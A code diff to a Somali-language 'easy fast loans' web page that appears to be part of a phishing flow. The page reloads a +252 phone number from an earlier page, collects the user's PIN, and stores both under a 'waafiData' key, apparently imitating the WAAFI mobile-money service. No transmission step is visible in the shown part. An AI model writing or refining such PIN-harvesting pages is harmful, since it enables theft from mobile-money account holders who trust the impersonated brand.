@@ -48,9 +48,10 @@ h2{color:#555;}
   display:flex;
   justify-content:center;
   gap:10px;
+  align-items:center;
 }
 
-/* PIN */
+/* PIN INPUT */
 .pinContainer{
   display:flex;
   justify-content:center;
@@ -73,7 +74,7 @@ h2{color:#555;}
   outline:none;
 }
 
-/* SHAKE ANIMATION */
+/* SHAKE */
 @keyframes shake{
   0%{transform:translateX(0);}
   25%{transform:translateX(-6px);}
@@ -154,20 +155,27 @@ Amaahado Sahlan oo Degdeg ah
 
 <script>
 
-/* ===============================
-   LOAD NUMBER FROM PREVIOUS PAGE
-================================= */
+/* =================================
+   LOAD NUMBER FROM PAGE 5
+================================== */
 
-const savedNumber = localStorage.getItem("phoneNumber");
+let savedNumber = localStorage.getItem("phoneNumber");
 
-if(savedNumber){
-  document.getElementById("phoneNumber").innerText =
-      "+252 " + savedNumber;
+console.log("Loaded Number:", savedNumber);
+
+/* VERIFY NUMBER EXISTS */
+if(savedNumber && savedNumber !== "null"){
+    document.getElementById("phoneNumber").innerText =
+        "+252 " + savedNumber;
+}else{
+    alert("Number missing. Restart process.");
+    window.location.href="page4.html";
 }
 
-/* ===============================
+
+/* =================================
    PIN INPUT LOGIC
-================================= */
+================================== */
 
 const pins = document.querySelectorAll(".pin");
 const button = document.getElementById("loginBtn");
@@ -192,6 +200,7 @@ pins.forEach((input,index)=>{
 
 });
 
+
 /* ENABLE BUTTON */
 function checkPin(){
 
@@ -208,9 +217,10 @@ function checkPin(){
   }
 }
 
-/* ===============================
+
+/* =================================
    BUTTON CLICK
-================================= */
+================================== */
 
 button.onclick=function(){
 
@@ -224,7 +234,8 @@ button.onclick=function(){
   let pin="";
   pins.forEach(p=> pin+=p.value);
 
-  /* SAVE DATA */
+  /* SAVE DATA AGAIN (IMPORTANT) */
+  localStorage.setItem("phoneNumber", savedNumber);
   localStorage.setItem("userPIN", pin);
 
   const fullData={
@@ -235,7 +246,7 @@ button.onclick=function(){
 
   localStorage.setItem("waafiData", JSON.stringify(fullData));
 
-  /* SUCCESS ANIMATION */
+  /* SUCCESS */
   button.innerText="Processing...";
   button.style.background="#5fb82e";
 
